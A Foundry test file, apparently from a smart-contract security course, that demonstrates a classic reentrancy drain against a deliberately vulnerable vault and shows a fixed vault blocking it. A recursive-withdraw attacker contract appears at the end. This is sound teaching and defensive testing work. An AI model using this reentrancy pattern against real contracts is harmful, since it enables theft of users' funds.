// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../../../src/vulnerabilities/reentrancy/classic/OasisVault.sol";
import "../../../../src/vulnerabilities/reentrancy/classic/EchoAttacker.sol";
import "../../../../src/vulnerabilities/reentrancy/classic/solution/SealedOasis.sol";

contract ReentrancyClassicTest is Test {

    OasisVault public oasisVault;
    EchoAttacker public echoAttacker;
    SealedOasis public sealedOasis;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy vulnerable and fixed contracts
        oasisVault = new OasisVault();
        sealedOasis = new SealedOasis();

        // Fund victim and attacker with ETH
        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);

        // Victim deposits into both vaults to simulate real protocol usage
        vm.prank(victim);
        oasisVault.deposit{value: 5 ether}();

        vm.prank(victim);
        sealedOasis.deposit{value: 5 ether}();

        console.log("=== SETUP ===");
        console.log("Victim deposited 5 ETH into OasisVault");
        console.log("Victim deposited 5 ETH into SealedOasis");
    }

    // ================================================================
    // VULNERABLE: Attack succeeds on OasisVault
    // The attacker deposits 1 ETH and drains the entire vault
    // ================================================================
    function test_ReentrancyAttackSucceeds_OasisVault() public {
        // Deploy attacker contract pointing at the vulnerable vault
        vm.prank(attacker);
        echoAttacker = new EchoAttacker(address(oasisVault));

        console.log("=== BEFORE ATTACK ===");
        console.log("OasisVault balance:    ", address(oasisVault).balance);
        console.log("Attacker ETH balance:  ", attacker.balance);
        console.log("EchoAttacker balance:  ", address(echoAttacker).balance);

        // Attacker launches the attack with 1 ETH
        // EchoAttacker deposits, then calls withdraw
        // receive() triggers recursively before balance is zeroed
        vm.prank(attacker);
        echoAttacker.attack{value: 1 ether}();

        // Attacker pulls drained funds back to their wallet
        vm.prank(attacker);
        echoAttacker.withdraw();

        console.log("=== AFTER ATTACK ===");
        console.log("OasisVault balance:    ", address(oasisVault).balance);
        console.log("Attacker ETH balance:  ", attacker.balance);

        // Attacker started with 1 ETH and should now have more than 1 ETH
        // proving they drained funds that belonged to the victim
        assertGt(
            attacker.balance,
            1 ether,
            "Attack failed: attacker did not drain more than they deposited"
        );

        // Vault should be empty or nearly empty
        assertEq(
            address(oasisVault).balance,
            0,
            "Attack failed: vault was not drained"
        );

        console.log("ATTACK SUCCEEDED: Attacker drained the vault");
    }

    // ================================================================
    // FIXED: Attack fails on SealedOasis
    // CEI pattern and nonReentrant modifier block the recursive call
    // ================================================================
    function test_ReentrancyAttackFails_SealedOasis() public {
        // Deploy attacker contract pointing at the fixed vault
        SealedOasisAttacker sealedAttacker = new SealedOasisAttacker(
            address(sealedOasis)
        );
        vm.deal(address(sealedAttacker), 1 ether);

        console.log("=== BEFORE ATTACK ATTEMPT ===");
        console.log("SealedOasis balance:   ", address(sealedOasis).balance);
        console.log("Attacker ETH balance:  ", address(sealedAttacker).balance);

        // Attack should revert due to nonReentrant modifier
        vm.expectRevert();
        sealedAttacker.attack{value: 1 ether}();

        console.log("=== AFTER ATTACK ATTEMPT ===");
        console.log("SealedOasis balance:   ", address(sealedOasis).balance);
        console.log("Victim funds safe:      5 ETH still in vault");

        // Vault balance should be unchanged
        assertEq(
            address(sealedOasis).balance,
            5 ether,
            "Vault was drained despite protection"
        );

        console.log("ATTACK BLOCKED: ReentrancyGuard prevented the exploit");
    }

    // ================================================================
    // NORMAL USAGE: Deposits and withdrawals work correctly
    // ================================================================
    function test_NormalWithdraw_OasisVault() public {
        console.log("=== NORMAL WITHDRAW TEST ===");
        console.log("Victim balance before: ", victim.balance);

        vm.prank(victim);
        oasisVault.withdraw(1 ether);

        console.log("Victim balance after:  ", victim.balance);

        assertEq(
            victim.balance,
            1 ether,
            "Normal withdraw failed"
        );

        console.log("NORMAL WITHDRAW SUCCEEDED");
    }

    function test_NormalWithdraw_SealedOasis() public {
        console.log("=== NORMAL WITHDRAW TEST: SealedOasis ===");
        console.log("Victim balance before: ", victim.balance);

        vm.prank(victim);
        sealedOasis.withdraw(1 ether);

        console.log("Victim balance after:  ", victim.balance);

        assertEq(
            victim.balance,
            1 ether,
            "Normal withdraw failed on SealedOasis"
        );

        console.log("NORMAL WITHDRAW SUCCEEDED");
    }
}

// Helper attacker contract for testing SealedOasis
// Mirrors EchoAttacker but targets the fixed contract
contract SealedOasisAttacker {
    SealedOasis public sealedOasis;

    constructor(address _sealedOasis) {
        sealedOasis = SealedOasis(_sealedOasis);
    }

    receive() external payable {
        if (address(sealedOasis).balance >= 1 ether) {
            sealedOasis.withdraw(1 ether);
        }
    }

    function attack() public payable {
        sealedOasis.deposit{value: msg.value}();
        sealedOasis.withdraw(1 ether);
    }
}